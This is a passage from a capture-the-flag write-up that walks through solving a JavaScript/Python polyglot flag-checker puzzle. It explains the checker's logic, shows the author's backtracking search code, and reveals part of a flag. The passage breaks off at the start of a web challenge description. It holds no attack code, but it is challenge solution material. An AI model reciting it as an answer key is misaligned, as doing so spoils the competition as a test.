read -p "flag? " flag
node $0 "$flag" && python3 $0 "$flag" && echo correct || echo incorrect
1<<4201337
*///""";from sys import argv
e = [...]
alpha="abcdefghijklmnopqrstuvwxyz_"
d=0;s=argv[1];1//1;"""
/*"""
#*/for (let i = 0; i < s.length; i ++) {/*
for i in range(6,len(s)-2):
    #*/d=(d*31+s.charCodeAt(i))%93097/*
    d+=e[i-6][alpha.index(s[i])][alpha.index(s[i+1])]#*/}
exit(+(d!=260,[d!=61343])[0])
4201337
```

Again, the numbers (`1<<4201337`, `1//1`, and `4201337`), tuples, and multiline strings `"""..."""` don't do anything. And `#` is Python's comment syntax. So the only lines that matter are

```py
from sys import argv
e = [...]
alpha="abcdefghijklmnopqrstuvwxyz_"
d=0;s=argv[1]
for i in range(6,len(s)-2):
    d+=e[i-6][alpha.index(s[i])][alpha.index(s[i+1])]#*/}
exit(+(d!=260,[d!=61343])[0])
```

This one does use `e`. The `range(6,len(s)-2)` makes it iterate over adjacent pairs of characters inside the curly braces of `lactf{...}`. `e` has a 2D array for every character in the flag, and it looks up numbers inside it based on the characters of the pair. These numbers must add up to `260`.

As an aside, this is a great line:

```py
exit(+(d!=260,[d!=61343])[0])
```

In JavaScript, the comma operator runs and discards the result of `d!=260`, so `(d!=260,[d!=61343])` returns the array `[d!=61343]`; `[0]` gets the boolean inside that, and `+` casts it to a number for the exit code. So JavaScript uses `d!=61343`.

In Python, the comma operator forms a tuple, so `[0]` indexes into the _tuple_ `(d!=260,[d!=61343])`, returning `d!=260`. Python uses `d!=260`.

I think it's cool that it exploits the difference in how `,` behaves in the two languages.

Anyways, I figured that since `len(e)` was 26, and the smallest value in `e` was 10, the content of the string inside the curly braces was 26 characters, and I needed to find a string whose pairs only had 10 values inside `e`. However, there seemed to be many such values in the array, so I felt like backtracking here wouldn't be helpful.

I instead tried to focus on the JavaScript backtracking problem and gave up.

At the time, the hint hadn't been released yet. When I came back to the challenge, I noticed the new hint:

> Note: The correct flag is 34 characters long.

This confirms what I suspected: the `lactf{}` part of the flag is 7 characters, leaving 27 characters in the string, or 26 adjacent pairs.

I tried working backwards:

<!-- prettier-ignore -->
```js
alpha="abcdefghijklmnopqrstuvwxyz_"
last = null
for (let i = e.length; i--;) {
  last = new Set(e[i].map((a,prev) =>a.flatMap((b,next) =>(!last || last.includes(alpha[next])) && b === 10?[prev]:[])).flat().map(i => alpha[i]))
  last = Array.from(last).join('')
  console.log(last)
}
```

This looks for every 10 in the last element of `e` and looks up the first character of the pair based on the indices. It keeps track of these potential characters for the previous element of `e`. It repeats the process, except it only considers character pairs where the second character was a potential candidate from the last round.

This was the output. Each row represents potential candidate letters from each 2D array in `e`.

```
abcefhmnpqrstuvxz_
adefgijkmnoprtuvxy_
adghijknoqtuvx_
cdegilnpswxyz_
acdegijlmnorstz
aeghijnoprswx_
abcehjkmrstuvyz_
acfijlmopqswxyz_
dhijmnprstu_
ikmnopuyz_
agjntvwy_
bdefklotxy_
abfghkmnopqtuyz_
acefghijmnopstuxyz_
efhklostuvwxz_
acdeghijlmnorsvz
aefklmpuvxy_
abcefhjoux_
cdfhnpqtw
abeijklmoswx
abcdjlnpstuvwy_
bcefghjknrtxyz_
adfgijmnoptuvxyz_
acglmnortyz
beghimnopqtwxz
cefghlqrstvx
```

This was disappointing to see, albeit not surprising, because I was hoping that it could narrow down the possibilities over time, revealing just one possible line of characters that is the flag.

I decided to try keeping track of all the possible strings formed so far, rather than the characters themselves. Currently, it looked like there could be exponentially many possible flags. But maybe there was only a handful of strings of characters that jump around the place.

<!-- prettier-ignore -->
```js
alpha="abcdefghijklmnopqrstuvwxyz_"
extend = (A, et) => {
  return A.flatMap((a) =>{
  index = alpha.indexOf(a[0])
  return et.flatMap((row, prevI) => row.flatMap((n, nextI) => (!a || nextI === index) && n === 10 ? [alpha[prevI] + (a || alpha[nextI])] : []))
  //return a.flatMap((b,next) =>b === 10?[alpha[prev]+alpha[next]]:[])
  //return wow.length > 0 ? [{ prev, poss: wow }] : []
})
}
last = extend([''], e.at(-1))
for (let i = 2; i < 8; i++) {
  last = extend(last, e.at(-i))
}
last
/*A = e.at(-1).flatMap((a,prev) =>{
  return a.flatMap((b,next) =>b === 10?[alpha[prev]+alpha[next]]:[])
  //return wow.length > 0 ? [{ prev, poss: wow }] : []
})
B = A.flatMap((a) =>{
  index = alpha.indexOf(a[0])
  return e.at(-2).flatMap((row, prevI) => row.flatMap((n, nextI) => nextI === index && n === 10 ? [alpha[prevI] + a] : []))
  //return a.flatMap((b,next) =>b === 10?[alpha[prev]+alpha[next]]:[])
  //return wow.length > 0 ? [{ prev, poss: wow }] : []
})*/
```

`extend` is a function that takes `A`, a list of possible flag strings, and `et`, the current 2D array from `e`. It starts off with the last pair, `extend([''], e.at(-1))`, then grows it about another 8 times.

![306 possible flag strings. The first several end with `_deal`.](../images/lactf/glot-permutes.png)

It still grows exponentially, albeit pretty slowly. But it's interesting that those first few end in `_deal`!

I filtered the options by those that end in `_deal` and continued extending the possible strings.

![17 possibilites, the first four end in `_free_deal`.](../images/lactf/glot-free-deal.png)

## web/quickstyle

> **web/quickstyle**
> by r2uwu2.
> 12 solves / 495 points
>
> Script on the streets, style in the sheets, they call me the cascader.
>
> Site - [quickstyle.chall.lac.tf](https://quickstyle.chall.lac.tf/)
>
> Admin Bot - <https://admin-bot.lac.tf/quickstyle>
>
> **Downloads**:
> [quickstyle.zip](https://github.com/uclaacm/lactf-archive/tree/main/2024/web/quickstyle)
